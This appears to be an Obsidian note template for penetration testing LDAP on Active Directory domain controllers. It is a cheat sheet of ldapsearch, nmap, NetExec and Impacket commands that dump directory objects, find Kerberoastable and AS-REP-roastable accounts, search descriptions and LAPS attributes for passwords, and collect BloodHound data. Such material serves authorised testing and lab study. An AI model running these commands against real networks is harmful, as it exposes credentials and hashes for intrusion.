<%-* let parts = tp.frontmatter.domain.split('.')
let domain = parts[0] || 'domain'
let tld = parts[1] || 'local'
let base = parts.map(p => `DC=${p}`).join(',')
let ip = tp.frontmatter.target_ip
let dcIp = tp.frontmatter.dc_ip || ip
let user = tp.frontmatter.username || ''
let pass = tp.frontmatter.password || ''
-%>
# LDAP — Port <% tp.frontmatter.current_port %>

---

## Nmap
```bash
nmap -p<% tp.frontmatter.current_port %> --script=ldap-rootdse,ldap-search <% ip %>
```

---

## Anonymous Bind — Enumerate RootDSE
```bash
ldapsearch -x -H ldap://<% dcIp %> -s base -b '' namingContexts rootDomainNamingContext defaultNamingContext
```

```bash
nmap -p<% tp.frontmatter.current_port %> --script=ldap-rootdse <% ip %>
```

---

## Anonymous Bind — Dump Everything
```bash
ldapsearch -x -H ldap://<% dcIp %> -D '' -w '' -b "<% base %>" > ldap_<% dcIp %>_all.txt
```

```bash
# Dump to file and count entries
ldapsearch -x -H ldap://<% dcIp %> -D '' -w '' -b "<% base %>" | tee ldap_all.txt | grep "^dn:" | wc -l
```

---

## Anonymous — Specific Object Types
```bash
# All users
ldapsearch -x -H ldap://<% dcIp %> -D '' -w '' -b "<% base %>" '(objectClass=person)' samaccountname userPrincipalName mail memberOf > ldap_users.txt
```

```bash
# All computers
ldapsearch -x -H ldap://<% dcIp %> -D '' -w '' -b "<% base %>" '(objectClass=computer)' name operatingSystem dNSHostName > ldap_computers.txt
```

```bash
# All groups
ldapsearch -x -H ldap://<% dcIp %> -D '' -w '' -b "<% base %>" '(objectClass=group)' name member > ldap_groups.txt
```

```bash
# Domain Admins members
ldapsearch -x -H ldap://<% dcIp %> -D '' -w '' -b "<% base %>" '(&(objectClass=group)(cn=Domain Admins))' member
```

---

## Authenticated Enumeration
```bash
ldapsearch -x -H ldap://<% dcIp %> -D '<% user %>@<% tp.frontmatter.domain %>' -w '<% pass %>' -b "<% base %>" > ldap_auth_all.txt
```

```bash
# Kerberoastable users (servicePrincipalName set)
ldapsearch -x -H ldap://<% dcIp %> -D '<% user %>@<% tp.frontmatter.domain %>' -w '<% pass %>' -b "<% base %>" '(&(objectClass=user)(servicePrincipalName=*))' samaccountname servicePrincipalName
```

```bash
# AS-REP Roastable users (no preauth)
ldapsearch -x -H ldap://<% dcIp %> -D '<% user %>@<% tp.frontmatter.domain %>' -w '<% pass %>' -b "<% base %>" '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' samaccountname
```

```bash
# Users with password never expires
ldapsearch -x -H ldap://<% dcIp %> -D '<% user %>@<% tp.frontmatter.domain %>' -w '<% pass %>' -b "<% base %>" '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' samaccountname
```

```bash
# Admin count = 1 (protected accounts)
ldapsearch -x -H ldap://<% dcIp %> -D '<% user %>@<% tp.frontmatter.domain %>' -w '<% pass %>' -b "<% base %>" '(&(objectClass=user)(adminCount=1))' samaccountname
```

```bash
# Accounts with description containing password
ldapsearch -x -H ldap://<% dcIp %> -D '<% user %>@<% tp.frontmatter.domain %>' -w '<% pass %>' -b "<% base %>" '(&(objectClass=user)(description=*))' samaccountname description
```

---

## NetExec LDAP
```bash
nxc ldap <% dcIp %> -u '<% user %>' -p '<% pass %>' --users
```

```bash
nxc ldap <% dcIp %> -u '<% user %>' -p '<% pass %>' --groups
```

```bash
nxc ldap <% dcIp %> -u '<% user %>' -p '<% pass %>' --kerberoasting kerberoastable.txt
```

```bash
nxc ldap <% dcIp %> -u '<% user %>' -p '<% pass %>' --asreproast asrep.txt
```

```bash
nxc ldap <% dcIp %> -u '<% user %>' -p '<% pass %>' --bloodhound -c All --dns-server <% dcIp %>
```

---

## Impacket LDAP Tools
```bash
# Get all domain users
impacket-GetADUsers -all <% tp.frontmatter.domain %>/<% user %>:'<% pass %>' -dc-ip <% dcIp %>
```

```bash
# Find delegations
impacket-findDelegation <% tp.frontmatter.domain %>/<% user %>:'<% pass %>' -dc-ip <% dcIp %>
```

---

## LDAPS (Secure LDAP — Port 636)
```bash
ldapsearch -x -H ldaps://<% dcIp %>:636 -D '<% user %>@<% tp.frontmatter.domain %>' -w '<% pass %>' -b "<% base %>" '(objectClass=person)' samaccountname
```

---

## Useful LDAP Filters Reference
```
All users:              (objectClass=user)
All computers:          (objectClass=computer)
All groups:             (objectClass=group)
Enabled users only:     (&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
SPNs set:               (&(objectClass=user)(servicePrincipalName=*))
No preauth:             (userAccountControl:1.2.840.113556.1.4.803:=4194304)
AdminCount=1:           (adminCount=1)
Domain controllers:     (&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))
LAPS password set:      (ms-Mcs-AdmPwd=*)
```

---

## Notes
